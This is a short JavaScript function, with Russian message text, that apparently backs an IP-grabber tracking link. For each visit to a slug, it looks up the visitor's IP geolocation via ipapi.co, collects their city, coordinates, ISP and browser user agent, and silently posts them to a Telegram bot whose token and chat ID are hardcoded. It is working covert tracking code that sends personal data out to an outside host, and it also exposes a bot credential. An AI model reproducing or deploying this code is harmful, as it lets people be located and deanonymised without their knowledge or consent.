async function logVisitor(slug) {
  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const data = await ipRes.json();
    const userAgent = navigator.userAgent;

    const text = `
🧲 Новое посещение:

<pre>
Ссылка: ${slug}
IP: ${data.ip}
Страна: ${data.country_name}
Город: ${data.city}
Координаты: ${data.latitude}, ${data.longitude}
Время: ${data.utc_offset}
Провайдер: ${data.org}
UA: ${userAgent}
</pre>
`;

    await fetch("https://api.telegram.org/bot7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: 2079893058,
        text,
        parse_mode: "HTML"
      })
    });
  } catch (err) {
    console.error("Ошибка логирования:", err);
  }
}
